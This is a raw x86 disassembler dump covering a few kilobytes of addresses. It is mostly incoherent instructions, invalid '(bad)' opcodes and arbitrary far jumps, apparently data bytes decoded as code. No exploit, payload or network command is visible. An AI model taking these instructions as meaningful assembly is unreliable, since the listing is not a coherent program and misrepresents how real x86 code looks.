  42bd0f:	xor    edx,eax
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd03
  42bd81:	loop   0x42bdc4
  42bd83:	pop    ds
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x7f000001,al
  42bd8d:	mov    eax,0xa0e7cf56
  42bd92:	adc    BYTE PTR [eax+0x1bad4f83],dh
  42bd98:	mov    ebx,0x15a23d54
  42bd9d:	clc    
  42bd9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd9f:	add    al,0x5c
  42bda1:	sbb    al,0x7
  42bda3:	jl     0x42bd6f
  42bda5:	inc    esp
  42bda7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bda8:	retf   
  42bda9:	xchg   ebp,eax
  42bdaa:	mov    dl,0x6e
  42bdac:	cmp    al,0xf5
  42bdae:	jmp    0x1fda:0xcd78e124
  42bdb5:	sar    edi,0xa5
  42bdb8:	neg    DWORD PTR [edx+0xc9ead23]
  42bdbe:	xchg   DWORD PTR [edi],edi
  42bdc0:	(bad)  
  42bdc1:	loope  0x42bd9f
  42bdc3:	push   0x5f7a20bb
  42bdc8:	test   BYTE PTR [ecx-0x17],bh
  42bdcb:	in     al,dx
  42bdcc:	cdq    
  42bdcd:	dec    ebp
  42bdce:	loopne 0x42bd75
  42bdd0:	adc    ebx,edi
  42bdd2:	repnz ror DWORD PTR [edi+0x47],1
  42bdd6:	adc    al,0x4f
  42bdd8:	add    ebx,esp
  42bdda:	adc    BYTE PTR [edx],0x63
  42bddd:	sub    eax,0x6419763
  42bde2:	mov    cl,BYTE PTR [eax]
  42bde4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bde5:	and    al,0xfc
  42bde7:	jmp    0xb84f215e
  42bdec:	sbb    BYTE PTR [esi],al
  42bdee:	mov    edx,0xc8f08ad3
  42bdf3:	lea    ecx,[ebx-0x6b6049e6]
  42bdf9:	and    ebp,ebp
  42bdfb:	lea    ecx,[ebx+0x1e24f253]
  42be01:	cmp    DWORD PTR [edx+0x7539642a],eax
  42be07:	in     al,0xe4
  42be09:	sub    edi,esp
  42be0b:	repz push edi
  42be0d:	inc    ebx
  42be0e:	jns    0x42bdc8
  42be10:	dec    edx
  42be11:	xor    eax,0x6a6ca47
  42be16:	push   esp
  42be17:	bound  esp,QWORD PTR [eax-0x25]
  42be1a:	dec    edx
  42be1b:	inc    esi
  42be1c:	jae    0x42be34
  42be1e:	das    
  42be1f:	jmp    0x42be55
  42be21:	xor    DWORD PTR [esi+ecx*4-0x7edeff8],0xffffff97
  42be29:	mov    ah,0x67
  42be2b:	jns    0x42bdb0
  42be2d:	fcmovnu st,st(5)
  42be2f:	add    cl,BYTE PTR fs:[ebx+edx*2+0x7d]
  42be34:	fsubr  st(2),st
  42be36:	into   
  42be37:	inc    edi
  42be38:	xor    edi,ebp
  42be3a:	pop    ss
  42be3b:	les    ebx,FWORD PTR gs:[ecx*4+0xf6b3c69]
  42be43:	xor    ebp,edx
  42be45:	(bad)  
  42be46:	jne    0x42be68
  42be48:	in     al,dx
  42be49:	gs mov bl,0xee
  42be4c:	stos   DWORD PTR es:[edi],eax
  42be4d:	pop    edx
  42be4e:	je     0x42be06
  42be50:	sbb    eax,0x54dac097
  42be55:	out    0x6a,al
  42be57:	inc    ebx
  42be58:	shl    BYTE PTR [ecx+0x14fc67b],cl
  42be5e:	enter  0xcd24,0x87
  42be62:	sub    eax,0x31057f8b
  42be67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be68:	jnp    0x42be60
  42be6a:	or     dl,BYTE PTR [edx-0x2a]
  42be6d:	mov    edi,0xa903082e
  42be72:	call   0xd49f:0x852cc337
  42be79:	mov    ebp,0x47ff87b8
  42be7e:	mov    ecx,0xbc1d0bf7
  42be83:	mov    ?,edi
  42be85:	mov    eax,0x20b7ce73
  42be8a:	and    ebx,DWORD PTR [edi]
  42be8c:	add    eax,0x24e08e30
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42beb3
  42bf01:	push   0x7
  42bf03:	cmp    esp,ebx
  42bf05:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0xf0000001
  42bf0d:	es mov esp,0x184515ce
  42bf13:	rol    DWORD PTR [edx+ebp*4],1
  42bf16:	ins    DWORD PTR es:[edi],dx
  42bf17:	and    BYTE PTR [ebp+eiz*2-0x25],al
  42bf1b:	sbb    BYTE PTR [edx-0x63],ch
  42bf1e:	mov    es,WORD PTR [esi-0x73]
  42bf21:	call   0x2e2de9dc
  42bf26:	sbb    esi,DWORD PTR [esp+esi*8]
  42bf29:	dec    edx
  42bf2a:	dec    ebp
  42bf2b:	xor    BYTE PTR [esi],bl
  42bf2d:	or     edi,DWORD PTR [esi]
  42bf2f:	mov    ebx,DWORD PTR [esi]
  42bf31:	sbb    esi,ebx
  42bf33:	push   ss
  42bf34:	imul   ebx,DWORD PTR [esi],0x25
  42bf37:	adc    eax,0x4638175a
  42bf3c:	lahf   
  42bf3d:	aas    
  42bf3e:	add    eax,0xecb71b80
  42bf43:	fidiv  DWORD PTR [ecx]
  42bf45:	mov    bh,BYTE PTR [esi+eax*8+0x1b]
  42bf49:	cmp    al,0x1f
  42bf4b:	inc    esi
  42bf4c:	(bad)  
  42bf4d:	adc    ecx,DWORD PTR [edx+edx*1]
  42bf50:	mov    eax,es
  42bf52:	shr    ebx,1
  42bf54:	push   cs
  42bf55:	xchg   ebx,eax
  42bf56:	dec    esi
  42bf57:	fidivr WORD PTR [ebx-0x58]
  42bf5a:	aaa    
  42bf5b:	shr    BYTE PTR [edi],1
  42bf5d:	mov    dh,0x18
  42bf5f:	and    BYTE PTR [edi+0x4b],ah
  42bf62:	stc    
  42bf63:	or     al,bl
  42bf65:	jp     0x42bf57
  42bf67:	xchg   esp,eax
  42bf68:	inc    esp
  42bf69:	ds out 0xf1,al
  42bf6c:	jecxz  0x42bf95
  42bf6e:	sub    eax,DWORD PTR [ebx+0x6c]
  42bf71:	add    eax,0xfd9083cf
  42bf76:	inc    esi
  42bf77:	jmp    0x42bf37
  42bf79:	and    bl,BYTE PTR [ecx+ebx*4]
  42bf7c:	xchg   esp,eax
  42bf7d:	loope  0x42bf79
  42bf7f:	(bad)  
  42bf81:	jb     0x42bf2d
  42bf83:	pop    edx
  42bf84:	sub    BYTE PTR [ecx+0x3],bh
  42bf87:	xchg   edx,eax
  42bf88:	mov    al,0x54
  42bf8b:	xor    cl,bh
  42bf8d:	push   ecx
  42bf8e:	lods   eax,DWORD PTR ds:[esi]
  42bf8f:	sub    al,0x3b
  42bf91:	jb     0x42bf6d
  42bf93:	xor    al,BYTE PTR [ebp-0x3972d831]
  42bf99:	shr    esi,cl
  42bf9b:	ss lahf 
  42bf9d:	inc    BYTE PTR [eax+0x6c]
  42bfa0:	adc    eax,0x33ebe430
  42bfa5:	inc    esp
  42bfa6:	add    al,0x51
  42bfa8:	mov    al,0x11
  42bfaa:	in     eax,dx
  42bfab:	ss sub bl,cl
  42bfae:	shl    DWORD PTR ds:0x178c3778,0xb1
  42bfb5:	ja     0x42bfbc
  42bfb7:	daa    
  42bfb8:	out    dx,eax
  42bfb9:	xor    ah,bh
  42bfbb:	ins    DWORD PTR es:[edi],dx
  42bfbc:	cmc    
  42bfbd:	dec    eax
  42bfbe:	stos   DWORD PTR es:[edi],eax
  42bfbf:	push   esi
  42bfc0:	and    eax,0x1412ec3a
  42bfc5:	or     edi,DWORD PTR [edx+0x6dfe1601]
  42bfcb:	pop    ds
  42bfcc:	je     0x42bf89
  42bfce:	mov    bh,0xdc
  42bfd0:	lods   al,BYTE PTR ds:[esi]
  42bfd1:	mov    ds:0xe7eced82,al
  42bfd6:	(bad)  
  42bfd7:	mov    dh,0x45
  42bfd9:	mov    bh,0x33
  42bfdb:	pop    edi
  42bfdc:	cmp    esp,ecx
  42bfde:	(bad)  
  42bfdf:	xchg   esi,eax
  42bfe0:	mov    eax,ds:0xbe719df0
  42bfe5:	jmp    0x42bff4
  42bfe7:	repz repnz scas al,BYTE PTR es:[edi]
  42bfea:	fldcw  WORD PTR [edi+0x672c3d4a]
  42bff0:	push   ecx
  42bff1:	cld    
  42bff2:	bound  ebx,QWORD PTR [eax]
  42bff4:	fisttp QWORD PTR [esi-0x35]
  42bff7:	retf   
  42bff8:	inc    esp
  42bff9:	stos   DWORD PTR es:[edi],eax
  42bffa:	(bad)  
  42bffb:	or     eax,0x9c851aee
  42c000:	nop
  42c001:	dec    ebx
  42c002:	adc    dl,0xf7
  42c005:	daa    
  42c006:	mov    edi,0xff7884e4
  42c00b:	je     0x42c02c
  42c00d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c00e:	pop    ds
  42c00f:	test   DWORD PTR [edx+0x0],ebp
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	ins    DWORD PTR es:[edi],dx
  42c081:	dec    eax
  42c082:	es and cl,0xd7
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0xd1000001
  42c08d:	jl     0x42c0d8
  42c08f:	(bad)  
  42c091:	pusha  
  42c092:	fcmovu st,st(1)
  42c094:	mov    al,ds:0x1ff051cd
  42c099:	pop    ebx
  42c09a:	and    DWORD PTR [esi],esi
  42c09c:	and    BYTE PTR [ebp+0x5c],bl
  42c09f:	ins    DWORD PTR es:[edi],dx
  42c0a0:	not    BYTE PTR [edi+0x6a]
  42c0a3:	dec    esp
  42c0a4:	scas   al,BYTE PTR es:[edi]
  42c0a5:	fcmove st,st(2)
  42c0a7:	mov    esi,0x5e994f84
  42c0ad:	cmp    BYTE PTR [edi],ah
  42c0af:	jo     0x42c12e
  42c0b1:	gs xor BYTE PTR ds:[si-0x786c],bl
  42c0b8:	xchg   edi,eax
  42c0b9:	std    
  42c0ba:	into   
  42c0bb:	in     eax,0xbc
  42c0bd:	mov    dl,0xd2
  42c0bf:	mov    eax,ds:0xdb1ffd69
  42c0c4:	ss sahf 
  42c0c6:	jo     0x42c12d
  42c0c8:	sub    ch,dl
  42c0ca:	jmp    0x42c0e0
  42c0cc:	rol    BYTE PTR [ebx-0x36c8e813],0xd5
  42c0d3:	stos   DWORD PTR es:[edi],eax
  42c0d4:	adc    bl,ch
  42c0d6:	aam    0xb0
  42c0d8:	fldcw  WORD PTR [edx-0x11]
  42c0db:	xchg   ebx,eax
  42c0dc:	xor    eax,0xa791b865
  42c0e1:	bound  eax,QWORD PTR [esp+ebx*1+0x14]
  42c0e5:	mov    al,cl
  42c0e7:	les    esp,FWORD PTR [eax-0xa873128]
  42c0ed:	adc    eax,0x5ffe8430
  42c0f2:	inc    edi
  42c0f3:	mov    ebx,0xb03e442a
  42c0f8:	ror    BYTE PTR gs:[ebx-0x35f41067],cl
  42c0ff:	pop    esi
  42c100:	mov    edx,0x46c93799
  42c105:	(bad)  [edx-0x6942eaac]
  42c10b:	test   al,0xb3
  42c10d:	addr16 ds ja 0x42c103
  42c111:	xlat   BYTE PTR cs:[ebx]
  42c113:	mov    al,ds:0x425194a9
  42c118:	dec    edi
  42c119:	or     eax,0x25795315
  42c11e:	push   ds
  42c11f:	jo     0x42c0f6
  42c121:	or     al,0xe9
  42c124:	adc    al,0xbf
  42c126:	adc    edx,DWORD PTR [edx+0x3fc8b29b]
  42c12c:	bound  ebp,QWORD PTR [esi]
  42c12e:	sbb    al,0xaf
  42c130:	lock jo 0x42c11d
  42c133:	jnp    0x42c0eb
  42c135:	pop    ecx
  42c136:	mov    ah,0xeb
  42c138:	fwait
  42c139:	pop    edx
  42c13a:	mov    bh,0xd6
  42c13c:	mov    eax,ds:0x5f390dc3
  42c141:	outs   dx,BYTE PTR ds:[esi]
  42c142:	iret   
  42c143:	mov    al,bh
  42c145:	sub    BYTE PTR [edi+ebx*4-0x7e9776c5],0x78
  42c14d:	nop
  42c14e:	or     eax,0x173c7db3
  42c153:	sub    dl,BYTE PTR [eax+0x7d416d73]
  42c159:	cwde   
  42c15a:	and    edi,DWORD PTR [ecx+0x1b164435]
  42c160:	pop    ss
  42c161:	aam    0x4d
  42c163:	and    eax,0x9f98d172
  42c168:	mov    ah,0xbc
  42c16a:	xchg   edx,eax
  42c16b:	mov    ds:0x7587402d,al
  42c170:	mov    eax,ds:0x8c0a88df
  42c175:	scas   eax,DWORD PTR es:[edi]
  42c176:	cmp    dl,ah
  42c178:	sbb    BYTE PTR [esi-0x78],bh
  42c17b:	adc    al,0x37
  42c17d:	adc    DWORD PTR [eax+0x50],ebx
  42c180:	jbe    0x42c193
  42c182:	mov    ebp,0x233baddf
  42c187:	xor    eax,0xf7013442
  42c18c:	loope  0x42c13e
  42c18e:	mov    al,ds:0x54df
	...
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	sbb    eax,0xe60dd09f
  42c205:	fadd   DWORD PTR [ecx]
  42c207:	add    BYTE PTR ds:0x3e000001,al
  42c20d:	int3   
  42c20e:	jno    0x42c1c2
  42c210:	stos   BYTE PTR es:[edi],al
  42c211:	cmc    
  42c212:	push   DWORD PTR [esi+ebx*1-0x554d8a16]
  42c219:	gs push ebp
  42c21b:	loopne 0x42c21c
  42c21d:	iret   
  42c21e:	clc    
  42c21f:	clc    
  42c220:	mov    al,dh
  42c222:	pop    eax
  42c223:	xor    DWORD PTR [eax+esi*4+0x78],ebp
  42c227:	pop    edi
  42c228:	rcl    DWORD PTR [edi],cl
  42c22a:	sub    BYTE PTR [ecx],ah
  42c22c:	(bad)  
  42c22d:	jb     0x42c209
  42c22f:	push   ecx
  42c230:	or     eax,0xb874db1b
  42c235:	jecxz  0x42c1ed
  42c237:	add    al,0x87
  42c239:	xchg   ebp,eax
  42c23a:	and    eax,0xc45744a9
  42c23f:	cmp    eax,0xbaa4afc4
  42c244:	mov    bh,0x5f
  42c246:	ja     0x42c1ff
  42c248:	shr    DWORD PTR [edx],cl
  42c24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c24b:	pop    ebp
  42c24c:	add    eax,0x17b12e3b
  42c251:	mov    edi,0x6b2264ed
  42c256:	jge    0x42c214
  42c258:	mov    ds:0x5db1af5b,eax
  42c25d:	mov    ah,0x47
  42c25f:	jbe    0x42c208
  42c261:	pop    ds
  42c262:	jge    0x42c264
  42c264:	call   0xdef86c02
  42c269:	push   ss
  42c26a:	adc    BYTE PTR [eax],al
  42c26c:	fild   DWORD PTR [edx+eiz*1+0x6c]
  42c270:	push   ss
  42c271:	dec    edx
  42c272:	mov    BYTE PTR [ecx+0xa],dh
  42c275:	pop    ecx
  42c276:	ss test eax,0x4c669868
  42c27c:	pop    edx
  42c27d:	addr16 lahf 
  42c27f:	data16 cmp BYTE PTR [edi],cl
  42c282:	in     al,dx
  42c283:	fisubr WORD PTR [esi]
  42c285:	call   0x372a:0x26b3855e
  42c28c:	fwait
  42c28d:	dec    esp
  42c28e:	jge    0x42c308
  42c290:	test   ch,dh
  42c292:	inc    ecx
  42c293:	cmp    al,0xaa
  42c295:	lods   eax,DWORD PTR ds:[esi]
  42c296:	jmp    DWORD PTR [eax+0x14149128]
  42c29c:	mov    ebx,0xdc30ce02
  42c2a1:	inc    ebx
  42c2a2:	add    al,0x38
  42c2a4:	cld    
  42c2a5:	adc    BYTE PTR [esi+eiz*8],bl
  42c2a8:	(bad)  
  42c2aa:	sti    
  42c2ab:	loopne 0x42c272
  42c2ad:	xchg   esp,eax
  42c2ae:	fmul   st,st(2)
  42c2b0:	out    dx,eax
  42c2b1:	lds    esi,FWORD PTR [ebx]
  42c2b3:	sbb    ch,BYTE PTR [ebp-0x6d]
  42c2b6:	aaa    
  42c2b7:	pop    ebp
  42c2b8:	imul   ebp,edx,0x59
  42c2bb:	enter  0xf6da,0x61
  42c2bf:	sub    DWORD PTR [edi],edi
  42c2c1:	add    ebp,DWORD PTR [eax]
  42c2c3:	sub    al,BYTE PTR [esi+0x63d2d617]
  42c2c9:	ret    0xbbce
  42c2cc:	ins    DWORD PTR es:[edi],dx
  42c2cd:	popa   
  42c2ce:	mov    cl,0x96
  42c2d1:	sbb    al,0x50
  42c2d3:	bound  esp,QWORD PTR [edi+esi*8-0x3ab30018]
  42c2da:	ins    DWORD PTR es:[edi],dx
  42c2db:	xchg   edx,edx
  42c2dd:	scas   al,BYTE PTR es:[edi]
  42c2de:	imul   esp,DWORD PTR [edx+ebp*1],0x2d
  42c2e2:	sub    DWORD PTR [edi],ecx
  42c2e4:	mov    ah,0xe8
  42c2e6:	mov    DWORD PTR [esi],esi
  42c2e8:	cwde   
  42c2e9:	(bad)  
  42c2ea:	adc    dh,ch
  42c2ec:	mov    dl,0x78
  42c2ee:	and    dl,BYTE PTR [esi]
  42c2f0:	jmp    0x42c345
  42c2f2:	fadd   st,st(4)
  42c2f4:	inc    ecx
  42c2f5:	jbe    0x42c2f5
  42c2f7:	pop    ebx
  42c2f8:	jae    0x42c2b5
  42c2fa:	(bad)
  42c2fd:	cdq    
  42c2fe:	pop    edx
  42c2ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c300:	ret    0x6cae
  42c303:	pusha  
  42c304:	xchg   edi,eax
  42c305:	cwde   
  42c306:	and    DWORD PTR [eax+0x22],edi
  42c309:	gs xchg ecx,eax
  42c30b:	sbb    ch,ah
  42c30d:	call   0x0:0x2fee0f
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x351d99f6
  42c383:	loop   0x42c370
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0x81000001,al
  42c38d:	cs jae 0x42c35b
  42c390:	mov    cl,0xd
  42c392:	push   ebp
  42c393:	jecxz  0x42c391
  42c395:	dec    ecx
  42c396:	dec    eax
  42c397:	sbb    BYTE PTR [ecx-0xa],dh
  42c39a:	imul   eax,DWORD PTR [ecx+0x1acf0344],0xffffffa9
  42c3a1:	jnp    0x42c3d2
  42c3a3:	push   esp
  42c3a4:	imul   esi,DWORD PTR [edx-0x1af86ed0],0x16b08321
  42c3ae:	aas    
  42c3af:	outs   dx,DWORD PTR ds:[esi]
  42c3b0:	dec    edi
  42c3b1:	fild   DWORD PTR [ebx-0x71e42e79]
  42c3b7:	jo     0x42c3f4
  42c3b9:	pop    ds
  42c3ba:	(bad)  
  42c3bb:	sub    ah,BYTE PTR [bx+di+0x20e3]
  42c3c0:	popf   
  42c3c1:	or     esi,ecx
  42c3c3:	jle    0x42c345
  42c3c5:	jg     0x42c3e1
  42c3c7:	add    eax,0xb1cfd01b
  42c3cc:	mov    al,0xe9
  42c3ce:	mov    ds:0x4473ad3,al
  42c3d3:	stc    
  42c3d4:	sahf   
  42c3d5:	or     dh,BYTE PTR [ebp+0xe]
  42c3d8:	xchg   edi,eax
  42c3d9:	cwde   
  42c3da:	inc    si
  42c3dc:	cdq    
  42c3dd:	ja     0x42c404
  42c3df:	jg     0x42c3b0
  42c3e1:	test   BYTE PTR [ecx-0x3a3a9376],ah
  42c3e7:	jbe    0x42c44a
  42c3e9:	push   esi
  42c3ea:	pop    ebp
  42c3eb:	xchg   ecx,eax
  42c3ec:	mov    gs,esp
  42c3ee:	outs   dx,DWORD PTR ds:[esi]
  42c3ef:	int3   
  42c3f0:	outs   dx,BYTE PTR ds:[esi]
  42c3f1:	push   0xffffff86
  42c3f3:	dec    ebp
  42c3f4:	repz xchg esi,eax
  42c3f6:	imul   ecx,DWORD PTR [esi-0x40e93068],0x4
  42c3fd:	and    ecx,0xb9d2e07c
  42c403:	jp     0x42c3aa
  42c405:	dec    ecx
  42c406:	adc    BYTE PTR [edx+0x2c],bh
  42c409:	(bad)  
  42c40a:	ds xchg cl,ah
  42c40d:	ss loop 0x42c487
  42c410:	inc    eax
  42c411:	xchg   edx,eax
  42c412:	fcomi  st,st(6)
  42c414:	iret   
  42c415:	pop    esp
  42c416:	in     eax,0x4
  42c418:	sbb    al,0x31
  42c41a:	mov    ds:0x5f9242e0,al
  42c41f:	mov    esp,0x4fc8d090
  42c424:	sti    
  42c425:	jb     0x42c496
  42c427:	mov    ah,0x9b
  42c429:	sub    eax,0xb5885359
  42c42e:	sub    DWORD PTR [esi+esi*4+0x4fe854b4],ebp
  42c435:	push   ecx
  42c436:	dec    ebx
  42c437:	cs ret 0x5c0f
  42c43b:	sub    BYTE PTR [edx-0x32614c9c],0x87
  42c442:	retf   
  42c443:	dec    edx
  42c444:	sub    edx,DWORD PTR [eax+0x4d]
  42c447:	test   al,0x5f
  42c449:	jne    0x42c453
  42c44b:	into   
  42c44c:	popf   
  42c44d:	xchg   ecx,eax
  42c44e:	rol    BYTE PTR [eax+0x2a2ded83],cl
  42c454:	scas   eax,DWORD PTR es:[edi]
  42c455:	sbb    al,0xb6
  42c457:	cmc    
  42c458:	jae    0x42c452
  42c45a:	stc    
  42c45b:	(bad)  
  42c45c:	sbb    edx,DWORD PTR [eax+0x5d982dc3]
  42c462:	leave  
  42c463:	adc    BYTE PTR [edx+eax*1],dl
  42c466:	addr16 xor esi,0xd97c28a3
  42c46d:	scas   al,BYTE PTR es:[edi]
  42c46e:	repz sbb DWORD PTR [edx],esp
  42c471:	leave  
  42c472:	and    bh,ah
  42c474:	fld    DWORD PTR ds:0x43f4d884
  42c47a:	es in  eax,dx
  42c47c:	daa    
  42c47d:	data16 mov ch,0xbd
  42c480:	out    dx,al
  42c481:	(bad)  
  42c482:	call   0x5780f69d
  42c487:	gs mov edx,0xa79d2bda
  42c48d:	jnp    0x42c451
  42c48f:	inc    edx
  42c490:	dec    eax
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x6f34,0x30
  42c502:	adc    esp,edi
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x78000001,al
  42c50d:	sbb    DWORD PTR [ebx-0x29],ebx
  42c510:	jo     0x42c530
  42c512:	jbe    0x42c4a5
  42c514:	mov    esp,0xdec81238
  42c519:	scas   al,BYTE PTR es:[edi]
  42c51a:	cmp    bh,BYTE PTR [ebp+0x61]
  42c51d:	cld    
  42c51e:	mov    edi,0x5a803a51
  42c523:	mov    edi,0x8180cc30
  42c528:	push   ebp
  42c529:	cmp    DWORD PTR [edi-0x5ee704ba],esi
  42c52f:	std    
  42c530:	adc    DWORD PTR [edi-0x7d2cbf06],ebp
  42c536:	loope  0x42c576
  42c538:	mov    ds:0x808980a1,al
  42c53d:	(bad)  
  42c53e:	adc    BYTE PTR [esi],dh
  42c540:	call   FWORD PTR [ecx+0x66]
  42c543:	les    esi,FWORD PTR [edi+eiz*8]
  42c546:	push   0x5a
  42c548:	mov    ds:0x71b384ce,al
  42c54d:	sub    esi,ebx
  42c54f:	jle    0x42c558
  42c551:	neg    BYTE PTR [edi+0x4c]
  42c554:	bound  ebp,QWORD PTR [eax+ebp*1]
  42c557:	push   es
  42c558:	cmovb  ecx,DWORD PTR [edx+0x27]
  42c55c:	or     eax,0x6dd786dd
  42c561:	imul   ecx,DWORD PTR [edi+ebp*4+0x52bed90c],0x55
  42c569:	sub    eax,0xc21e462d
  42c56e:	mov    cl,0x94
  42c570:	into   
  42c571:	adc    dh,BYTE PTR [edx]
  42c573:	popf   
  42c574:	fsubr  QWORD PTR [ebp+eiz*2+0x4d]
  42c578:	cmp    esp,ebx
  42c57a:	lahf   
  42c57b:	(bad)  
  42c57c:	clc    
  42c57d:	mov    edx,0x3cfd9033
  42c582:	out    0x41,al
  42c584:	jle    0x42c566
  42c586:	cmp    al,BYTE PTR [eax+0x6b]
  42c589:	je     0x42c59b
  42c58b:	test   DWORD PTR ds:[eax],ecx
  42c58e:	popf   
  42c58f:	pop    ebp
  42c590:	mov    edx,0x4ae30184
  42c595:	enter  0x2a35,0x74
  42c599:	jmp    0xe4f2:0x566fa128
  42c5a0:	cmp    edx,DWORD PTR [eax+0x569564a8]
  42c5a6:	pop    edi
  42c5a7:	jnp    0x42c572
  42c5a9:	add    DWORD PTR [eax+eax*4+0x2ff1d9f7],esp
  42c5b0:	inc    ebp
  42c5b1:	add    al,0xb6
  42c5b3:	ss push ebx
  42c5b5:	(bad)  
  42c5b6:	and    esi,esi
  42c5b8:	mov    ds:0x3630fd80,eax
  42c5bd:	or     al,0x9e
  42c5bf:	loop   0x42c5e2
  42c5c1:	push   es
  42c5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5c3:	pusha  
  42c5c4:	rcl    DWORD PTR [ebp-0x17],cl
  42c5c7:	jge    0x42c5e5
  42c5c9:	adc    BYTE PTR [eax],0x55
  42c5cc:	clts   
  42c5ce:	add    eax,0x16a205bf
  42c5d3:	and    eax,0xcb72845b
  42c5d8:	jg     0x42c571
  42c5da:	xchg   ebp,eax
  42c5db:	jns    0x42c5f9
  42c5dd:	mov    al,ds:0x1e8fe319
  42c5e2:	outs   dx,DWORD PTR ds:[esi]
  42c5e4:	ins    BYTE PTR es:[edi],dx
  42c5e5:	pop    eax
  42c5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5e7:	ret    
  42c5e8:	mov    edx,0x8e66c2db
  42c5ed:	pop    ds
  42c5ee:	out    0xe5,al
  42c5f0:	jae    0x42c5a8
  42c5f2:	or     DWORD PTR [ebp-0x671072c2],ecx
  42c5f8:	sbb    bh,BYTE PTR [ecx-0x5e]
  42c5fb:	sbb    al,0x14
  42c5fd:	pop    eax
  42c5fe:	test   DWORD PTR [ebp+0x1066753b],esp
  42c604:	in     eax,0x8b
  42c606:	add    ecx,edx
  42c608:	mov    ecx,0xa69ac569
  42c60d:	pop    edx
  42c60e:	jg     0x42c624
  42c610:	xchg   esi,eax
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x15920395]
  42c681:	stos   BYTE PTR es:[edi],al
  42c682:	arpl   WORD PTR [ecx],si
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0x83000001,al
  42c68d:	push   0x3b16e549
  42c692:	add    bl,BYTE PTR [ecx-0x6f]
  42c695:	repz sbb DWORD PTR [edx],esp
  42c698:	xchg   esi,eax
  42c699:	dec    eax
  42c69a:	lock and BYTE PTR [ebx+0x4c],dl
  42c69e:	xor    esp,DWORD PTR [esi+0x3c]
  42c6a1:	dec    edi
  42c6a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c6a4:	xchg   edi,eax
  42c6a5:	fistp  WORD PTR ds:0x2075d9bc
  42c6ab:	cmc    
  42c6ac:	lahf   
  42c6ad:	cmp    edx,DWORD PTR [edx]
  42c6af:	cmp    cl,dl
  42c6b1:	mov    ebx,0xbc0b2f25
  42c6b6:	int    0x8f
  42c6b8:	rdpmc  
  42c6ba:	push   ds
  42c6bb:	mov    dh,0x43
  42c6bd:	xchg   ebx,eax
  42c6be:	mov    dl,0x6a
  42c6c0:	jl     0x42c649
  42c6c2:	sub    BYTE PTR [ebx],ch
  42c6c4:	push   ss
  42c6c5:	or     BYTE PTR [edi],bh
  42c6c7:	pop    esi
  42c6c8:	ja     0x42c6c1
  42c6ca:	jns    0x42c718
  42c6cc:	fsubr  st(4),st
  42c6ce:	add    eax,0xbd85b599
  42c6d3:	sub    bl,BYTE PTR [eax+0x47]
  42c6d6:	or     DWORD PTR [edi+0x6eedb548],esp
  42c6dc:	popa   
  42c6dd:	push   cs
  42c6de:	out    0x71,eax
  42c6e0:	inc    esi
  42c6e1:	not    esi
  42c6e3:	adc    eax,0x226a1e5b
  42c6e8:	(bad)  
  42c6e9:	xor    DWORD PTR [ebx],ecx
  42c6eb:	jle    0x42c682
  42c6ed:	ret    0x3951
  42c6f0:	xchg   bh,bl
  42c6f2:	popa   
  42c6f3:	pop    ebx
  42c6f4:	adc    bl,bl
  42c6f6:	das    
  42c6f7:	xor    esi,DWORD PTR [ebp-0x68942958]
  42c6fd:	push   esi
  42c6fe:	jmp    0x42c71d
  42c700:	mov    ecx,0xf57e6aed
  42c705:	add    eax,0x9d74a2e1
  42c70a:	mov    ah,BYTE PTR [eax+0x6f]
  42c70d:	aad    0x6b
  42c70f:	ins    BYTE PTR es:[edi],dx
  42c710:	imul   BYTE PTR [ebp+0x57]
  42c713:	sbb    esp,DWORD PTR [ebx-0x1c]
  42c716:	mov    DWORD PTR [ebx+0x11],eax
  42c719:	xor    BYTE PTR [esi],0x63
  42c71c:	pop    ebx
  42c71d:	call   FWORD PTR [eax+0x172b978c]
